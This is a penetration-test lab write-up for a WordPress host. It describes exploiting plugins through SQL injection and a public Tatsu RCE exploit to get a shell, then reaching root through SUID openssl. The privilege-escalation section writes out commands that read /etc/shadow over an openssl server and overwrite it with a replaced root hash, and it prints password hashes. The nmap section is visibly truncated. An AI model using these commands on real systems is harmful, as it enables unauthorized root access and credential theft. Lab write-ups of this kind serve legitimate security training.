# Pentest 013 - WEB01-PRD V2 - 7 - 10.14.1.7

## Scanning and Enumerating

Starting off as always with an nmap + nikto scan.
Additionally reviewing the lab details, the following are implied - 
`Linux` `WordPress Plugin` `Privilege Escalation` `Permissions`
  
### Nmap
```bash

| tastu | 4.3 |  

Checking `searchsploit` for "perfect survey" I find an exploit:
![image1](/VHL/Reports/013/image013_1.png)


## Exploitation


### Initial Access

After determining `perfect survey` was vulnerable to a SQL injection attack, and there was indeed MySQL running on the system, I decided to go ahead with this one. 
Searchsploit yielded some results, but I had trouble working with this due to the default behaviors (although it took me awhile to figure out).

...pause...

From here, I spent a good hour and a half testing `prefect-survey`; it was indeed vulnerable to SQL Injection, which I was able to perform both manually, and via `php/webapps/50766.py`.
I was able to begin successfully enumerating the wordpress tables, but it was very slow, and not yielding anything notable at the time. While this was occurring, I tested out the `tatsu` plugin instead.

Googling yielded some promising results - https://github.com/darkpills/CVE-2021-25094-tatsu-preauth-rce.
I created this locally and tested by setting up a listener - immediately this got me a shell.


### Privilege Escalation

Once I was able to retrieve a shell, I determined this was on Linux 3.0, and suspected it might be vulnerable to Dirty COW. 
Unfortunately, it did not have the appropriate / necessary kernel modules to properly exploit (as I tested several versions of dirty COW), so proceeded to enumerate the rest of the system.

The __only__ thing that particularly stood out to me was the openssl had SUID.
I've used openssl a lot, so this intrigued me - how can I use this to escalate permissions?

Google `openssl privilege escalation` returned [this](https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099) page , so I started here.
While this article discussed `getcap`, functionally, `openssl` having SUID meant this was irrelevant since it ran with all root permissions anyways.

First I generated the keys:
```bash
cd /tmp
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

From here, I switched to `/` to set the serving directory, started a server, and retrieved `/etc/shadow`:  
```bash
cd /

penssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP

curl -k https://10.14.1.7:1337/etc/shadow
root:$6$LlwqDEME$eHfVC5JsDUuGSkSXzi9ps6WbyQ5i0WfuxBKsW/O4MLzbMmwy0c2/3PEX7xRHUBzEywYMbvhIAcSbQA3ZNXCA2/:19145:0:99999:7:::

```

I modified the root user hash to one like the preceding example: `myhackerpass` or `$1$mysalt$7DTZJIc9s6z60L6aj0Sui.`

I then encrypted this modified shadow file and restored it to /etc/shadow:
```bash
openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem

cd /

openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/key.pem -out /etc/shadow
```

Lastly, I attempted to su - root, with the modified password I inserted:

Success!
